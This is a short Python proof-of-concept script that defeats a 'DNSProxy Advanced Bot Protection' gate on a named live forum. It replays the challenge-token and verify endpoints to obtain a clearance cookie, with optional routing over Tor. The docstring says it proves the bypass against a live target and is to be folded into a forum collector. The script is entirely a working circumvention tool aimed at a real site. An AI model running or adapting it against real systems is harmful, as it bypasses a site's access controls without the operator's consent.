#!/usr/bin/env python3
"""POC: replay the DNSProxy 'Advanced Bot Protection' interstitial as 2 GETs.

The gate's bot detection is client-side JS that gates nothing server-side, so
the clearance flow is just:
    GET /generate-challenge-token?return=<path>  -> token (body text)
    GET /verify-challenge?token=<t>&return=<path> -> Set-Cookie (clearance)
then the original URL loads as the real XenForo page with that cookie.

Proves the bypass against a live target. No browser, no JS engine.

Usage:
    python dnsproxy_bypass.py https://xforums.st/threads/zdem0n-by-xforums.313357/
    HTTPS_PROXY=socks5h://127.0.0.1:9050 python dnsproxy_bypass.py <url>   # over Tor

ponytail: single-file probe, httpx (already a dep). No retry/backoff — it's a
POC, not the collector. UA is a plain Firefox string; swap to the real cookie-
mint UA when this graduates into collectors/forum.
"""

from __future__ import annotations

import sys
from urllib.parse import urlparse, urlencode

import httpx

UA = "Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0"

# The interstitial's tells (title + the DNSProxy brand) vs. the real board
# (XenForo stamps id="XF" / data-app on <html>).
GATE_MARKERS = ("DNSPROXY ANTIBOT", "Advanced Bot Protection", "One More Step")
XF_MARKERS = ('id="XF"', 'data-app="public"', "p-body")


def classify(html: str) -> str:
    if any(m in html for m in GATE_MARKERS):
        return "GATE"
    if any(m in html for m in XF_MARKERS):
        return "XENFORO"
    return "UNKNOWN"


def main(target: str) -> int:
    p = urlparse(target)
    origin = f"{p.scheme}://{p.netloc}"
    return_path = p.path + (f"?{p.query}" if p.query else "")

    # httpx reads HTTPS_PROXY/HTTP_PROXY from env via trust_env (default True).
    with httpx.Client(
        headers={"User-Agent": UA}, follow_redirects=True, timeout=30
    ) as c:
        r1 = c.get(target)
        print(f"[1] GET {target}\n    {r1.status_code} -> {classify(r1.text)} "
              f"({len(r1.text)} bytes)")
        if classify(r1.text) == "XENFORO":
            print("    already clear (no gate) — nothing to bypass")
            return 0

        tok_url = f"{origin}/generate-challenge-token?{urlencode({'return': return_path})}"
        r2 = c.get(tok_url)
        token = r2.text.strip()
        print(f"[2] GET /generate-challenge-token\n    {r2.status_code}, "
              f"token={token[:48]}{'…' if len(token) > 48 else ''} ({len(token)} chars)")
        if not token:
            print("    no token returned — flow changed, abort")
            return 1

        ver_url = f"{origin}/verify-challenge?{urlencode({'token': token, 'return': return_path})}"
        r3 = c.get(ver_url)
        cookies = dict(c.cookies)
        print(f"[3] GET /verify-challenge\n    {r3.status_code}, "
              f"jar now: {list(cookies)}")

        r4 = c.get(target)
        verdict = classify(r4.text)
        print(f"[4] re-GET {target}\n    {r4.status_code} -> {verdict} "
              f"({len(r4.text)} bytes)")

        if verdict == "XENFORO":
            print("\n>>> BYPASS CONFIRMED: 2 GETs + cookie, real board reached.")
            return 0
        print(f"\n>>> NOT cleared (still {verdict}). Gate may have hardened.")
        return 1


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(__doc__)
        sys.exit(2)
    sys.exit(main(sys.argv[1]))
